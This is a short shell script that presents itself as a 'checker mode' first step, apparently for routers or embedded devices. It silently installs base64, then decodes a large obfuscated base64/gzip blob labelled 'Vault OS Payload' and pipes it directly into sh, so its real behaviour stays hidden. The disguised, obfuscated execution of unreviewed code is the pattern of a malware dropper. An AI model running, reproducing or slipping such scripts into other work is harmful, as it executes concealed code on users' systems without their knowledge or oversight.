#!/bin/sh
echo "====================================================="
echo "  FIRST STEP - CHECKER MODE - ACTIVATING...."
echo "====================================================="

if ! command -v base64 >/dev/null 2>&1; then
    echo "📦 Preping dependencies..."
    
    if command -v opkg >/dev/null 2>&1; then
        opkg update >/dev/null 2>&1
        opkg install coreutils-base64 >/dev/null 2>&1
    elif command -v apk >/dev/null 2>&1; then
        apk update >/dev/null 2>&1
        apk add coreutils >/dev/null 2>&1 
    else
        echo "❌ ERROR: No package manager found! Cannot install base64."
        exit 1
    fi
    
    if ! command -v base64 >/dev/null 2>&1; then
         echo "❌ ERROR: Base64 installation failed. Aborting."
         exit 1
    fi
fi

PAYLOAD="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
nH8DjjZS2pIlAAA="

echo "🚀 Executing Vault OS Payload..."
echo "$PAYLOAD" | base64 -d | gunzip | sh

exit 0
